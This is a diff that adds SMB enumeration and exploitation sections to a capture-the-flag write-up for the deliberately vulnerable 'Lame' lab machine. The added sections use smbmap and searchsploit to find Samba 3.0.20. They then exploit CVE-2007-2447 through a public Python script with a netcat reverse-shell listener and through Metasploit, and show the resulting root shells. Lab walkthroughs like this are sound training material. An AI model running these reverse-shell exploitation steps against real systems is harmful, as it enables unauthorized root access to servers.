@@ -103,7 +103,125 @@ In this case, it doesn't.
 Without a username at least there isn't much we can do with SSH for now, we do have the version of OpenSSH it's using but there are no vulnerabilities we're able to exploit at this stage.
 
 ## SMB
+We can use a tool called smbmap to enumerate the samba shares on the server which will hopefully give us some more info and possibly an indication of where to go next
+```sh
+root@kali:~# smbmap -H 10.10.10.3 -R
+[+] Finding open SMB ports....
+[+] User SMB session established on 10.10.10.3...
+[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        tmp                                                     READ, WRITE     oh noes!
+        .\
+        dr--r--r--                0 Mon Apr  6 10:35:20 2020    .
+        dw--w--w--                0 Sun May 20 14:36:11 2012    ..
+        -w--w--w--                0 Mon Apr  6 07:46:10 2020    5147.jsvc_up
+        dr--r--r--                0 Mon Apr  6 07:45:03 2020    .ICE-unix
+        dr--r--r--                0 Mon Apr  6 07:45:28 2020    .X11-unix
+        -w--w--w--               11 Mon Apr  6 07:45:28 2020    .X0-lock
+        .\.X11-unix\
+        dr--r--r--                0 Mon Apr  6 07:45:28 2020    .
+        dr--r--r--                0 Mon Apr  6 10:35:20 2020    ..
+        -r--r--r--                0 Mon Apr  6 07:45:28 2020    X0
+        opt                                                     NO ACCESS
+        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+```
+The H flag is used for specifying the hostname and the R flag is used to recursively list shares as we can see with tmp.
+
+File wise there's nothing that jumps out but the version number is leaked which we can use to see if there are any exploits available
+```sh
+root@kali:~# searchsploit samba 3.0.20
+---------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                              |  Path
+                                                                            | (/usr/share/exploitdb/)
+---------------------------------------------------------------------------- ----------------------------------------
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasp | exploits/unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow                                       | exploits/linux/remote/7701.txt
+---------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+```
 
 ## Exploiting SMB
+The exploit above relates to [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447) which allows us to abuse the non-default username map script and achieve unauthenticated command execution.
+
+We can exploit this using a [python script](https://github.com/amriunix/CVE-2007-2447) or [metasploit](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script), both of which should achieve the same outcome.
+
+*Python Script*
+Before running the script we'll need to setup a netcat listener
+```sh
+root@kali:~# nc -lvnp 4444
+listening on [any] 4444 ...
+```
+Then we can run the script
+```sh
+root@kali:~/htb/lame/CVE-2007-2447# python usermap_script.py 10.10.10.3 139 10.10.14.7 4444
+[*] CVE-2007-2447 - Samba usermap script
+[+] Connecting !
+[+] Payload was sent - check netcat !
+```
+And get a root shell!
+```sh
+connect to [10.10.14.7] from (UNKNOWN) [10.10.10.3] 40546
+whoami
+root
+id
+uid=0(root) gid=0(root)
+pwd
+/
+```
+
+*Metasploit*
+Before running the exploit we need to locate the module and set the options
+```sh
+msf5 > use exploit/multi/samba/usermap_script
+msf5 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   139              yes       The target port (TCP)
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+RHOSTS => 10.10.10.3
+```
+We can then let metasploit do its thing
+```sh
+msf5 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP double handler on 10.10.14.7:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo pjl2fzMCHYRY995e;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "pjl2fzMCHYRY995e\r\n"
+[*] Matching...
+[*] A is input...
+```
+And we get a root shell!
+```sh
+[*] Command shell session 1 opened (10.10.14.7:4444 -> 10.10.10.3:47530) at 2020-04-09 13:58:12 -0400
+
+whoami
+root
+id
+uid=0(root) gid=0(root)
+pwd
+/
+```
+Once we have a root shell it's trivial to find the root and user flags to complete the box.
 
 ## Alternate Route - distccd 
